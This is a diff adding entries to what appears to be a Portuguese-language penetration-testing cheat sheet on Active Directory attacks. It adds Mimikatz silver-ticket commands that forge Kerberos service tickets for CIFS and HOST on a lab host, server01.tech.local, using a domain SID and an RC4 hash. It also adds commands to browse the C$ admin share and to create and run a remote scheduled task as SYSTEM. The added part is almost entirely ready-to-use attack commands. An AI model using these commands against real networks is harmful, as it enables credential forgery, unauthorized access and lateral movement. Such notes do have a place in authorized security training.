@@ -1367,6 +1367,31 @@ lsadump::lsa /patch
 kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
 kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
 ```
+##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): ACESSAR COMPARTILHAMENTOS
+```
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
+```
+```
+dir \\server01\c$
+dir \\server01.tech.local\c$
+```
+##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): CRIAR TAREFAS AGENDADAS
+```
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:host /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:host /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
+```
+```
+schtasks /create /S server01.tech.local  /SC weekly /RU "NT Authority\System" /TN "STCheck" /TR "whoami > c:\eu.txt"
+
+schtasks /Run /S server01.tech.local 
+```
+
+
+
+
+
+
 [SPN](https://adsecurity.org/?page_id=183)
 
 SERVIÇOS:
